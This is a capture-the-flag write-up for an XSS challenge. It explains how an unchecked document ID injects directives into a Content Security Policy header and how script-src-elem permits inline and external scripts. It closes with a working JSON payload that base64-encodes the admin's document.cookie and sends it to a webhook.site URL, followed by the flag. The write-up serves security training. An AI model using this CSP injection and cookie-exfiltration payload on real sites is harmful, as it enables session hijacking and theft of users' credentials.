# Completely secure publishing

This challenge is obviously an XSS based challenge that has content security policy enabled.

The CSP is very secure, with `default-src: 'none'; connect-src 'none';`.

However, something interesting is the site sets the CSP using some user input: ```report-uri /report-csp-violation?id=${req.params.id}`);`` :thinking:. `req.params.id` is checked such that a document with such an ID exists in the database. If we can somehow control this ID, we can inject stuff into the CSP. 

Fortunately, there is no check when inserting into the DB, so we can control this ID. However, if we inject `script-src 'unsafe-inline'` it still doesn't work since the browser takes the first directive. Fortunately, [script-src-elem](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-elem) is a newly introduced directive that  overrides `script-src` for script tags. However, with `connect-src: 'none'`, how are we going to get the flag out? 

It seems [connect-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src) only applies to `fetch` and a few other APIs. One way to circumvent this is to dynamically create another script tag that has a `src` set to some other site. This is possible because we can whitelist the external site through the `srcipt-src-elem`.

Final payload:

```json
{
    "title":"Hello, world",
    "content":"<script>var script = document.createElement('script');script.src = `http://webhook.site/004a7611-4cc0-49de-99e5-c6a84e8ff031?${btoa(document.cookie)}`;document.head.appendChild(script);</script>",
    "_id":"givflagpls; script-src-elem 'unsafe-inline' webhook.site ; abc z;"
}
```

Once the admin's cookies are obtained, just set the secret cookie and get the flag:

`bcactf{csp_g0_brr_g84en9}`

